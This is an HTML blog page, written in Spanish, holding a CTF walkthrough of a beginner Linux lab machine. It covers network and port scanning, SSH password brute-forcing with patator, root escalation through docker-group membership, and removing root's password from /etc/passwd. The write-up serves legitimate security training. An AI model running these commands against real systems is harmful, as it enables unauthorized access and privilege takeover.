@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | CanYouHackMe?</title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewbox="0 0 16 16" height="1.2em" width="1.2em" xmlns="http://www.w3.org/2000/svg">
+      <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">CanYouHackMe?</h2>
+          <small class="date">09 Sep 2024</small>
+          <div class="categories">
+            
+            <a href="#!" class="category">thl</a>
+            
+            <a href="#!" class="category">ctf</a>
+            
+            <a href="#!" class="category">linux</a>
+            
+            <a href="#!" class="category">principiante</a>
+            
+          </div>
+        </div>
+        <div class="content">
+<p><img src="/assets/images/canyou/canyou.jpg" alt="image"></p>
+
+<p>En esta ocasión voy a resolver una máquina <strong>Linux</strong> creada por Enaitz de dificultad <strong>Principiante</strong> para la plataforma de <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<h3 id="escaneo-de-red-local">Escaneo de red local</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> enp0s3 <span class="nt">--localnet</span>
+10.0.2.169      08:00:27:24:af:8e       PCS Systemtechnik GmbH
+</code></pre></div></div>
+
+<ul>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">arp-scan</code></strong>: Herramienta que escanea la red local usando el protocolo ARP (Address Resolution Protocol).</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">-I enp0s3</code></strong>: Especifica la interfaz de red a utilizar (en este caso <code class="language-plaintext highlighter-rouge">enp0s3</code>).</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">-localnet</code></strong>: Indica que se escaneará toda la red local.</li>
+</ul>
+
+<p>Obtenemos la dirección IP <code class="language-plaintext highlighter-rouge">10.0.2.169</code> y la dirección MAC de la máquina victima.</p>
+
+<h3 id="escaneo-de-puertos-con-nmap">Escaneo de puertos con Nmap</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-T</span> 4 10.0.2.169
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<ul>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">nmap</code></strong>: Herramienta de escaneo de redes que detecta hosts, servicios y puertos abiertos.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">-sS</code></strong>: Realiza un escaneo “SYN” o escaneo furtivo. Detecta puertos abiertos sin establecer una conexión completa, lo que lo hace más rápido y menos detectado.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">-p-</code></strong>: Escanea todos los puertos TCP (del 1 al 65535).</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">-Pn</code></strong>: Omite el escaneo de ping, asume que el host está activo.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-n</code>: Evita la resolución de DNS para acelerar el escaneo.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-v</code>: Modo detallado (verbose), muestra más información durante el escaneo.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">-T 4</code></strong>: Ajusta la velocidad del escaneo, en este caso a una velocidad agresiva (T4).</li>
+</ul>
+
+<p>Se descubren dos puertos abiertos: 22 (SSH) y 80 (HTTP).</p>
+
+<h3 id="escaneo-detallado-de-versiones-de-servicios">Escaneo detallado de versiones de servicios</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 10.0.2.169
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 a8da3d7dc8cdc769ceed13fadeb99650 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 0324b9cc0bc21509db739bb524d541ca <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.58
+|_http-title: Did not follow redirect to http://canyouhackme.thl
+|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+</code></pre></div></div>
+
+<ul>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">-sCV</code></strong>: Realiza un escaneo de servicios (<code class="language-plaintext highlighter-rouge">sV</code>) para obtener la versión del software, y ejecuta scripts de detección estándar (<code class="language-plaintext highlighter-rouge">sC</code>).</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">-p22,80</code></strong>: Escanea únicamente los puertos 22 (SSH) y 80 (HTTP).</li>
+</ul>
+
+<p>Se identifican las versiones de los servicios:</p>
+
+<ul>
+  <li>
+<strong>OpenSSH 9.6p1</strong> (SSH).</li>
+  <li>
+<strong>Apache 2.4.58</strong> (HTTP), con un redireccionamiento a <code class="language-plaintext highlighter-rouge">http://canyouhackme.thl</code>.</li>
+</ul>
+
+<h3 id="modificación-del-archivo-etchosts">Modificación del archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>
+</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'10.0.2.169 canyouhackme.thl'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.0.2.169 canyouhackme.thl
+</code></pre></div></div>
+
+<ul>
+  <li>
+<strong>/etc/hosts</strong>: Archivo que mapea direcciones IP a nombres de dominio locales.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">echo</code></strong>: Imprime la cadena ‘10.0.2.169 canyouhackme.thl’.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">sudo tee -a /etc/hosts</code></strong>: Añade (<code class="language-plaintext highlighter-rouge">-a</code>) la salida del comando <code class="language-plaintext highlighter-rouge">echo</code> al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. Esto mapea el dominio <code class="language-plaintext highlighter-rouge">canyouhackme.thl</code> a la IP <code class="language-plaintext highlighter-rouge">10.0.2.169</code>, permitiendo acceder al sitio web localmente usando el nombre de dominio.</li>
+</ul>
+
+<h3 id="interacción-con-el-servidor-web">Interacción con el servidor web</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://canyouhackme.thl
+/<span class="k">*</span> Hola juan, te he dejado un correo importate, cundo puedas, leelo <span class="k">*</span>/
+</code></pre></div></div>
+
+<ul>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">curl</code></strong>: Herramienta que realiza peticiones HTTP desde la línea de comandos.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">http://canyouhackme.thl</code></strong>: Hace una petición HTTP al servidor web en <code class="language-plaintext highlighter-rouge">10.0.2.169</code> utilizando el nombre de dominio configurado en el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<p>Obtenemos en el código fuente un comentario que menciona a un usuario llamado “juan” y que tiene un correo importante.</p>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<h3 id="ataque-de-fuerza-bruta-con-patator">Ataque de fuerza bruta con <code class="language-plaintext highlighter-rouge">patator</code>
+</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patator ssh_login <span class="nv">host</span><span class="o">=</span>10.0.2.169 <span class="nv">user</span><span class="o">=</span>juan <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>~/rockyou.txt <span class="nt">-x</span> ignore:mesg<span class="o">=</span><span class="s1">'Authentication failed.'</span> <span class="nt">-x</span> ignore:size<span class="o">=</span>53
+22:26:03 patator    INFO - 0     40     0.105 | matrix                             |   610 | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
+</code></pre></div></div>
+
+<ul>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">patator</code></strong>: Herramienta para realizar ataques de fuerza bruta sobre diferentes protocolos. En este caso, se usa para probar múltiples contraseñas contra el servicio SSH.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">ssh_login</code></strong>: Módulo de <code class="language-plaintext highlighter-rouge">patator</code> para atacar el servicio SSH.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">host=10.0.2.169</code></strong>: Especifica el host objetivo.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">user=juan</code></strong>: Define el nombre de usuario (<code class="language-plaintext highlighter-rouge">juan</code>) para intentar iniciar sesión.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">password=FILE0</code></strong>: Indica que las contraseñas se tomarán de un archivo. El archivo se define con <code class="language-plaintext highlighter-rouge">0=~/rockyou.txt</code>, que es un diccionario común de contraseñas.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">x ignore:mesg='Authentication failed.'</code></strong>: Ignora los intentos fallidos que devuelven este mensaje.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">x ignore:size=53</code></strong>: Ignora respuestas de cierto tamaño que coincidan con intentos fallidos.</li>
+</ul>
+
+<p>Obtenemos la contraseña del usuario <code class="language-plaintext highlighter-rouge">juan</code>.</p>
+
+<h3 id="acceso-ssh-al-servidor">Acceso SSH al servidor</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh juan@10.0.2.169
+juan@10.0.2.169<span class="s1">'s password: 
+Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-41-generic x86_64)
+Last login: Sat Sep  7 19:26:39 2024 from 192.168.1.142
+User flag: 440**********
+juan@TheHackersLabs-CanYouHackMe:~$
+</span></code></pre></div></div>
+
+<ul>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">ssh</code></strong>: Comando para iniciar una sesión SSH (Secure Shell) en un servidor remoto.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">juan@10.0.2.169</code></strong>: Especifica el usuario (<code class="language-plaintext highlighter-rouge">juan</code>) y el servidor (<code class="language-plaintext highlighter-rouge">10.0.2.169</code>) al que te estás conectando.</li>
+</ul>
+
+<p>Se inicia sesión en la máquina como el usuario <code class="language-plaintext highlighter-rouge">juan</code> y se recibe el “User flag”, un código que confirma que se ha logrado acceso como usuario no privilegiado.</p>
+
+<h3 id="verificación-de-permisos-del-usuario">Verificación de permisos del usuario</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@TheHackersLabs-CanYouHackMe:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>juan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>juan<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>juan<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>,1002<span class="o">(</span>docker<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">id</code></strong>: Muestra la identidad y los grupos a los que pertenece el usuario actual.</li>
+</ul>
+
+<p>Se confirma que el usuario <code class="language-plaintext highlighter-rouge">juan</code> pertenece al grupo <code class="language-plaintext highlighter-rouge">docker</code>, lo que sugiere una posible vía de escalada de privilegios.</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<h3 id="escalada-de-privilegios-utilizando-docker">Escalada de privilegios utilizando Docker</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@TheHackersLabs-CanYouHackMe:~<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> alpine <span class="nb">chroot</span> /mnt bash
+Root flag: 233f3<span class="k">**************</span>
+root@6f066383d815:/#
+</code></pre></div></div>
+
+<ul>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">docker run</code></strong>: Ejecuta un contenedor Docker.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">-v /:/mnt</code></strong>: Monta el sistema de archivos raíz (<code class="language-plaintext highlighter-rouge">/</code>) del host en el contenedor bajo el directorio <code class="language-plaintext highlighter-rouge">/mnt</code>. Esto da acceso completo al sistema de archivos del host.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">—rm</code></strong>: Elimina el contenedor cuando termine de ejecutarse.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">-it</code></strong>: Abre una sesión interactiva (terminal) en el contenedor.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">alpine</code></strong>: Imagen ligera de Linux (Alpine Linux) que se usará para ejecutar el contenedor.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">chroot /mnt bash</code></strong>: Cambia el directorio raíz del contenedor a <code class="language-plaintext highlighter-rouge">/mnt</code> (el sistema de archivos del host), y abre una shell Bash con acceso completo al sistema de archivos del host.</li>
+</ul>
+
+<p>Se obtiene acceso como root en el sistema del host desde dentro del contenedor Docker, permitiendo visualizar el “Root flag”.</p>
+
+<h3 id="modificación-del-archivo-etcpasswd">Modificación del archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>
+</h3>
+
+<p>Ahora solo nos queda obtener acceso al host. Nos movemos al directorio <code class="language-plaintext highlighter-rouge">/mnt</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi ./etc/passwd
+</code></pre></div></div>
+
+<ul>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">vi</code></strong>: Editor de texto en terminal que se usa para editar archivos.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">/etc/passwd</code></strong>: Archivo que almacena información sobre los usuarios del sistema. Cada línea representa un usuario.</li>
+</ul>
+
+<p>La línea para el usuario <code class="language-plaintext highlighter-rouge">root</code> normalmente tiene un campo de contraseña, pero se puede eliminar para permitir el acceso sin contraseña.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+</code></pre></div></div>
+
+<p>Esta es la línea original para el usuario <code class="language-plaintext highlighter-rouge">root</code>. El campo <code class="language-plaintext highlighter-rouge">x</code> indica que la contraseña está almacenada de forma encriptada en el archivo <code class="language-plaintext highlighter-rouge">/etc/shadow</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root::0:0:root:/root:/bin/bash
+</code></pre></div></div>
+
+<p>Se elimina el <code class="language-plaintext highlighter-rouge">x</code>, lo que indica que ahora el usuario <code class="language-plaintext highlighter-rouge">root</code> no tiene contraseña. Esto permitirá hacer <code class="language-plaintext highlighter-rouge">su</code> para cambiar al usuario <code class="language-plaintext highlighter-rouge">root</code> sin necesidad de una contraseña.</p>
+
+<h3 id="acceso-como-usuario-root">Acceso como usuario root</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/mnt <span class="c"># exit</span>
+juan@TheHackersLabs-CanYouHackMe:~<span class="nv">$ </span>su
+root@TheHackersLabs-CanYouHackMe:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@TheHackersLabs-CanYouHackMe:~#
+</code></pre></div></div>
+
+<ul>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">su</code></strong>: Comando para cambiar al usuario root. Dado que se eliminó la contraseña de root en el paso anterior, ahora se puede acceder como root sin necesidad de ingresar una contraseña.</li>
+</ul>
+
+<h1 id="conclusión"><strong>Conclusión</strong></h1>
+
+<p>Este CTF pone en práctica múltiples técnicas de hacking:</p>
+
+<ul>
+  <li>
+<strong>Reconocimiento</strong>: Escaneo de red y de puertos para identificar servicios vulnerables.</li>
+  <li>
+<strong>Explotación</strong>: Ataque de fuerza bruta para obtener credenciales de usuario.</li>
+  <li>
+<strong>Escalada de privilegios</strong>: Uso del grupo <code class="language-plaintext highlighter-rouge">docker</code> para obtener acceso completo a la máquina mediante contenedores Docker.</li>
+</ul>
+</div>
+      </section>
+      <footer>
+  <p>© 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
